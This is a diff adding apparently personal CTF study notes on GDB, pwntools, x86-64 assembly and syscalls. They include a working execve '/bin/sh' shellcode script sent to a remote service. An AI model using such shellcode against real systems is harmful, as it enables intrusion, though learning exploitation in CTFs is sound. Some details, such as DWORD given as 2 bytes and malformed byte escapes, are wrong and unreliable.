@@ -1,0 +1,168 @@
+# GDB
+	i b						- 查斷點
+	i r						- registers
+	i proc m             	- 查 mem map
+	i local 				- 列出變數
+	n                       - run one source code instruction
+	s 						- run one source code instruction 
+	disas <func>         	- 反組譯 function
+	d <breakpoint num>   	- 刪斷點 
+	b *address     			- 	 
+	x/20(w|b|h|g)(x|u|d|s|i) <address>	- 查看20個 address 內容
+		 | | | |  
+		 | | | |   
+		 | | | |
+		 4 1 2 8 bytes
+	rec						- record
+	rsi						- 回上一步
+	rni						- 回上一步 
+	set $reg=0x1234			- 改
+	set *address=0x12345678
+	set {char}
+	attach <pid>			- attach 到 process
+	lay asm
+	fs cmd|src|asm
+	c-x c-a 				- exit lay
+	
+
+	QWORD = 8bytes
+	DWORD = 2bytes
+
+	
+# pwntool
+
+``` python
+from pwn import *
+
+context.arch = 'amd64' # i386 for 32bit
+r = remote('csie.ctf.tw', 10123)
+
+r.sendline(p64(0x400505))
+a = asm """
+	...
+		"""
+
+r.interactive() 	# same as nc csie.ctf.tw 10123
+```
+
+p32(<32bit int>) 		- Packs an integer to little-endian 
+p32(0x1234) == "/x34/x12/x00/x00"
+u32(<4 bytes string>) 	- Unpacks a little-endian string to int
+p64(<64bit int>) 		- //
+u64(<8 bytes string>) 	- //
+flat(<iterable>) 		- 把摻數理的東西全都 p32/p64 (看 context arch 決定)
+	flat([[0x1234, 0x4321]*3, 6, 7], 7122)
+
+ELF(<binary path>) - 載入一個 binary
+	e = ELF('./bof')
+	e = ELF('./libc.so.6')
+		e.symbols['system']
+		e.search('/bin/sh')
+
+# assembly
+
+		--------------------- low address
+		
+	rsp	--------------------- 
+			local variables
+	rbp	---------------------
+			saved rbp				  
+		---------------------
+			return address        stack frame
+		---------------------
+			arguments
+		---------------------
+
+		--------------------- high address
+
+
+rsp - 指向 stack 頂
+rbp - 指向 stack 底
+rip - 指向目前執行位置
+
+```info
+可在 ~/.gdbinit 中加上 set disassembly-flavor intel
+```
+
+mov a, b (a = b)
+
+lea rax, [rsp+8] (rax = address of (rsp+8))
+mov rax, [rsp+8] (rax = (rsp+8) 的內容)
+
+push rax (sub rsp, 8 ; mov [rsp], rax;)
+pop rdi  (mov rdi, [rsp]; add rsp, 8;)
+
+jmp A (mov rip, A)
+call A (push next_rip; jmp A)
+ret (pop rip)
+
+nop opcode=0x90
+
+Calling Convention
+	- 使用 register 順序為 rdi, rsi, rdx, rcx, r8, r9
+	- 第7個參數開始會放到 stack frame 當中的 arguments 區間
+
+function prologue
+	push rbp
+	mov rbp, rsp
+	sub rsp, 0x50
+
+function epilogue
+	leave (mov rsp, rbp; pop rbp)
+	ret
+
+syscall
+rax - syscall number
+arguments: rdi, rsi, rdx, rcx, r8, r9
+return: rax
+
+```assembly
+// read(0, buf, 0x100), assume buf = 0x602000
+xor rdi, rdi
+mov rsi, 0x602000
+mov rdx, 0x100
+mov rax, 0
+syscall
+```
+
+
+```python
+# shell exp
+from pwn import *
+from IPython import embed
+
+context.arch = 'amd64'
+
+r = remote('127.0.0.1', 7126)
+
+a = asm("""
+	push 0x68
+	mov rax, 0x732f2f2f6e69622f 
+	push rax
+	mov rdi, rsp
+	xor rsi, rsi
+	xor rdx, rdx
+	mov rax, 59
+	syscall
+		""")
+raw_input("@")
+r.send(a)
+
+r.interactive()
+```
+0x732f2f2f6e69622f 代表 "/bin///sh"
+
+objdump -M intel -d <bin>
+
+
+啟手勢
+	- file
+	- strings
+	- run
+	- objdump
+	- idapro
+
+patch
+	hexeditor
+		- search for bytes
+		- change to 0x90 (nop)
